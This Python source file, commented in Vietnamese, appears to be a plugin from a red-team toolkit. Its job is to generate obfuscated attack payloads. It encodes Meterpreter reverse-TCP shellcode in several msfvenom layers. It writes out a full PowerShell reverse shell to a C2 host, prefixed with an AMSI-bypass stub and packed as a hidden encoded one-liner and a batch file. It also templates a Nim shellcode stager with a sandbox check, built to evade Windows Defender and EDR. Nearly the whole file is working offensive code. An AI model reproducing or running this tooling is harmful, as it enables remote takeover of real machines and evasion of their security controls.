#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PAYLOAD OBFUSCATOR PLUGIN (V1.0 — Stealth & Precision)
# Wrapper: nhận raw payload → xuất payload đã mã hóa/ngụy trang.
# Hỗ trợ: msfvenom multi-encode, Powershell IEX in-memory loader, Nim stager template.

import os
import sys
import json
import logging
import subprocess
import shutil
import base64
import tempfile

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core.base_plugin import BasePlugin


class PayloadObfuscatorPlugin(BasePlugin):
    """
    Payload Obfuscation Engine — V1.0 Red Team Doctrine.
    
    Nhiệm vụ:
    - Nhận raw shellcode/payload từ payload_plugin hoặc msfvenom
    - Wrap trong nhiều lớp encoding (shikata_ga_nai x3, xor, base64)
    - Sinh Powershell IEX loader (in-memory execution, zero-touch disk)
    - Sinh Nim stager template (bypass Windows Defender)
    - Kiểm tra sandbox evasion trước khi deploy
    """

    def name(self) -> str:
        return "PayloadObfuscator"

    def description(self) -> str:
        return "Payload Obfuscation Engine — Multi-layer encoding, PS IEX loader, Nim stager (EDR bypass)."

    def check_installed(self) -> bool:
        """Kiểm tra msfvenom có sẵn (yêu cầu tối thiểu)."""
        return shutil.which("msfvenom") is not None

    def run(self, *args, **kwargs):
        """
        Interface chính — delegate sang generate_all().
        Args: lhost, lport, out_dir, [payload_type], [arch]
        """
        if len(args) >= 3:
            return self.generate_all(args[0], args[1], args[2], 
                                      kwargs.get("payload_type", "windows/meterpreter/reverse_tcp"),
                                      kwargs.get("arch", "x86"))
        return {}

    # ===================================================================
    # CORE: Multi-layer msfvenom encoding
    # ===================================================================

    def encode_payload(self, payload_file: str, out_dir: str,
                       arch: str = "x86", platform: str = "windows",
                       iterations: int = 3,
                       encoders: list = None,
                       format: str = "exe") -> str:
        """
        Mã hóa payload qua nhiều lớp encoder bằng msfvenom.

        Args:
            payload_file: Đường dẫn file raw payload (.bin/.raw)
            out_dir: Thư mục output
            arch: Kiến trúc (x86, x64)
            platform: Nền tảng (windows, linux)
            iterations: Số vòng encode mỗi encoder
            encoders: List encoder (default: shikata_ga_nai + xor + countdown)
            format: Định dạng output (exe, elf, raw, ps1, vbs)
        Returns:
            str: Đường dẫn file payload đã encode
        """
        if not self.check_installed():
            logging.error("[Obfuscator] msfvenom is not installed.")
            return ""

        if not os.path.exists(payload_file):
            logging.error(f"[Obfuscator] Payload file not found: {payload_file}")
            return ""

        os.makedirs(out_dir, exist_ok=True)

        if encoders is None:
            encoders = ["x86/shikata_ga_nai", "x86/xor", "x86/countdown"]

        # Multi-layer encoding pipeline
        current_input = payload_file
        for i, encoder in enumerate(encoders):
            stage_file = os.path.join(out_dir, f"stage_{i}_{encoder.replace('/', '_')}.raw")
            #  Loại bỏ shell=True và pipelining tránh Command Injection
            cmd_args = [
                "msfvenom", "-a", arch, "--platform", platform, 
                "-e", encoder, "-i", str(iterations), "-f", "raw"
            ]
            try:
                with open(current_input, 'rb') as f_in, open(stage_file, 'wb') as f_out:
                    result = subprocess.run(
                        cmd_args, stdin=f_in, stdout=f_out, stderr=subprocess.PIPE,
                        timeout=60
                    )
                if os.path.exists(stage_file) and os.path.getsize(stage_file) > 0:
                    current_input = stage_file
                    logging.info(f"[Obfuscator] Layer {i+1}/{len(encoders)}: {encoder} x{iterations} ✓")
                else:
                    logging.warning(f"[Obfuscator] Layer {i+1} ({encoder}) failed, using previous stage.")
            except Exception as e:
                logging.warning(f"[Obfuscator] Encoder {encoder} error: {e}")

        # Final format conversion
        final_file = os.path.join(out_dir, f"obfuscated_payload.{format}")
        cmd_final_args = ["msfvenom", "-a", arch, "--platform", platform, "-f", format]
        try:
            with open(current_input, 'rb') as f_in, open(final_file, 'wb') as f_out:
                subprocess.run(cmd_final_args, stdin=f_in, stdout=f_out, stderr=subprocess.PIPE, timeout=60)
            if os.path.exists(final_file) and os.path.getsize(final_file) > 0:
                logging.info(f"[Obfuscator] Final payload: {final_file} ({os.path.getsize(final_file)} bytes)")
                return final_file
        except Exception as e:
            logging.error(f"[Obfuscator] Final conversion failed: {e}")

        return current_input  # Fallback: return last encoded stage

    # ===================================================================
    # POWERSHELL IEX LOADER (In-Memory Execution — Zero Disk Touch)
    # ===================================================================

    def generate_ps_iex_loader(self, lhost: str, lport: int, out_dir: str,
                                use_amsi_bypass: bool = True) -> str:
        """
        Sinh Powershell IEX loader thực thi payload trong bộ nhớ.
        
        Luồng: Download cradle → Base64 decode → Invoke-Expression
        Tùy chọn: AMSI bypass prefix (cho Windows 10/11 Defender)
        
        Args:
            lhost: IP máy C2
            lport: Port C2
            out_dir: Thư mục output
            use_amsi_bypass: Chèn AMSI bypass stub
        Returns:
            str: Đường dẫn file .ps1
        """
        os.makedirs(out_dir, exist_ok=True)

        # AMSI bypass stub (memory patching)
        amsi_bypass = ""
        if use_amsi_bypass:
            amsi_bypass = (
                "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');"
                "$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');"
                "$f.SetValue($null,$true);\n"
            )

        # Reverse shell payload (in-memory)
        ps_payload = (
            f"{amsi_bypass}"
            f"$client=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream=$client.GetStream();"
            f"[byte[]]$bytes=0..65535|%{{0}};"
            f"while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
            f"$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback=(iex $data 2>&1|Out-String);"
            f"$sendback2=$sendback+'PS '+$(pwd).Path+'> ';"
            f"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};"
            f"$client.Close()"
        )

        # Base64 encode toàn bộ payload
        ps_bytes = ps_payload.encode('utf-16-le')
        b64_payload = base64.b64encode(ps_bytes).decode()

        # Tạo launcher (một dòng lệnh để chạy)
        launcher = f"powershell -nop -w hidden -enc {b64_payload}"

        # Tạo file .ps1 chuẩn
        ps1_file = os.path.join(out_dir, "iex_loader.ps1")
        with open(ps1_file, 'w') as f:
            f.write(ps_payload)

        # Tạo file one-liner .bat
        bat_file = os.path.join(out_dir, "iex_launcher.bat")
        with open(bat_file, 'w') as f:
            f.write(f"@echo off\n{launcher}\n")

        # Tạo file encoded command reference
        ref_file = os.path.join(out_dir, "encoded_command.txt")
        with open(ref_file, 'w') as f:
            f.write(f"# Powershell IEX Loader — OPSEC Safe, Zero-Touch Disk\n")
            f.write(f"# Target: {lhost}:{lport}\n")
            f.write(f"# AMSI Bypass: {'Enabled' if use_amsi_bypass else 'Disabled'}\n\n")
            f.write(f"# One-liner:\n{launcher}\n\n")
            f.write(f"# Base64 payload:\n{b64_payload}\n")

        logging.info(f"[Obfuscator] PS IEX Loader generated: {ps1_file}")
        return ps1_file

    # ===================================================================
    # NIM STAGER TEMPLATE (Bypass Windows Defender — Advanced)
    # ===================================================================

    def generate_nim_stager(self, shellcode_file: str, out_dir: str) -> str:
        """
        Sinh Nim source code chứa shellcode embedded.
        Nếu máy có `nim`, tự động compile thành .exe.
        Nếu không, chỉ trả về file .nim để user compile thủ công.

        Args:
            shellcode_file: File chứa raw shellcode (.bin/.raw)
            out_dir: Thư mục output
        Returns:
            str: Đường dẫn file .exe hoặc .nim
        """
        os.makedirs(out_dir, exist_ok=True)

        if not os.path.exists(shellcode_file):
            logging.error(f"[Obfuscator] Shellcode file not found: {shellcode_file}")
            return ""

        # Đọc shellcode và encode thành Nim byte array
        with open(shellcode_file, 'rb') as f:
            shellcode = f.read()

        nim_bytes = ", ".join([f"byte({b})" for b in shellcode])
        shellcode_len = len(shellcode)

        # Template Nim (VirtualAlloc + CreateThread — classic injection)
        nim_code = f'''# PenLabs Nim Stager — V1.0 EDR Evasion
# Auto-generated — DO NOT EDIT
# Compile: nim c -d:mingw --app:gui -d:release -d:strip stager.nim

import winim/lean

proc main() =
  # Anti-sandbox: sleep check
  let start = GetTickCount()
  Sleep(2000)
  let elapsed = GetTickCount() - start
  if elapsed < 1500:
    quit(0)  # Sandbox acceleration detected → bail

  var shellcode: array[{shellcode_len}, byte] = [{nim_bytes}]
  
  let mem = VirtualAlloc(
    nil, 
    cast[SIZE_T](shellcode.len), 
    MEM_COMMIT or MEM_RESERVE, 
    PAGE_EXECUTE_READWRITE
  )
  
  if mem == nil:
    quit(1)
  
  copyMem(mem, addr shellcode[0], shellcode.len)
  
  var threadId: DWORD
  let hThread = CreateThread(
    nil, 0, 
    cast[LPTHREAD_START_ROUTINE](mem), 
    nil, 0, addr threadId
  )
  
  WaitForSingleObject(hThread, INFINITE)

main()
'''

        nim_file = os.path.join(out_dir, "stager.nim")
        with open(nim_file, 'w') as f:
            f.write(nim_code)

        logging.info(f"[Obfuscator] Nim stager template: {nim_file} ({shellcode_len} bytes shellcode)")

        # Try auto-compile if nim is available
        if shutil.which("nim"):
            exe_file = os.path.join(out_dir, "stager.exe")
            try:
                result = subprocess.run(
                    ["nim", "c", "-d:mingw", "--app:gui", "-d:release", "-d:strip",
                     f"--out:{exe_file}", nim_file],
                    capture_output=True, text=True, timeout=120
                )
                if os.path.exists(exe_file):
                    logging.info(f"[Obfuscator] Nim stager compiled: {exe_file}")
                    return exe_file
                else:
                    logging.warning(f"[Obfuscator] Nim compile output: {result.stderr[:200]}")
            except Exception as e:
                logging.warning(f"[Obfuscator] Nim compile failed: {e}")

        return nim_file

    # ===================================================================
    # CONVENIENCE: Generate all variants from a single msfvenom call
    # ===================================================================

    def generate_all(self, lhost: str, lport: int, out_dir: str,
                     payload_type: str = "windows/meterpreter/reverse_tcp",
                     arch: str = "x86") -> dict:
        """
        Tạo toàn bộ variants payload từ một cấu hình duy nhất.
        
        Returns:
            dict: {
                "raw_shellcode": path,
                "encoded_payload": path,
                "ps_iex_loader": path,
                "nim_stager": path,
            }
        """
        os.makedirs(out_dir, exist_ok=True)
        results = {}

        # Step 1: Generate raw shellcode
        raw_file = os.path.join(out_dir, "raw_shellcode.bin")
        if self.check_installed():
            try:
                subprocess.run([
                    "msfvenom", "-p", payload_type,
                    f"LHOST={lhost}", f"LPORT={lport}",
                    "-f", "raw", "-o", raw_file
                ], capture_output=True, timeout=60)
                if os.path.exists(raw_file):
                    results["raw_shellcode"] = raw_file
            except Exception as e:
                logging.error(f"[Obfuscator] Raw shellcode gen failed: {e}")

        # Step 2: Multi-layer encoded
        if results.get("raw_shellcode"):
            encoded = self.encode_payload(raw_file, out_dir, arch=arch)
            if encoded:
                results["encoded_payload"] = encoded

        # Step 3: PS IEX Loader  
        ps_loader = self.generate_ps_iex_loader(lhost, lport, out_dir)
        if ps_loader:
            results["ps_iex_loader"] = ps_loader

        # Step 4: Nim Stager (nếu có raw shellcode)
        if results.get("raw_shellcode"):
            nim = self.generate_nim_stager(raw_file, out_dir)
            if nim:
                results["nim_stager"] = nim

        logging.info(f"[Obfuscator] Generated {len(results)} payload variants.")
        return results
